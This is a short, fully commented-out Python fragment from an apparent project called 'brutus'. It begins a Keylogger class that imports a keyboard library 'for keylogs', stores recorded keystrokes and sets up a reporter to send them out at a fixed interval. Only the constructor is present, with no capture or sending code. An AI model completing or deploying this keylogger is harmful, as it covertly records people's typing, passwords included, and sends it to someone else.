# from datetime import datetime

# # Timer is to make a method runs after an `interval` amount of time
# from threading import Timer

# import keyboard  # for keylogs

# from brutus.utils.reporters import ReporterFactory, ReportMethod


# class Keylogger(ReporterFactory):
#     def __init__(
#         self, interval: int, reporter_type: ReportMethod, **reporter_args: list
#     ):
#         # send report at interval
#         self.interval = interval

#         self.reporter_args = reporter_args

#         # keystrokes recorded within `interval`
#         self.log = ''

#         # record start & end datetimes
#         self.begin_at = datetime.now()
#         self.end_at = datetime.now()  # TODO

#         super().__init__(reporter_type=reporter_type)

#         self.reporter = self.create_reporter()
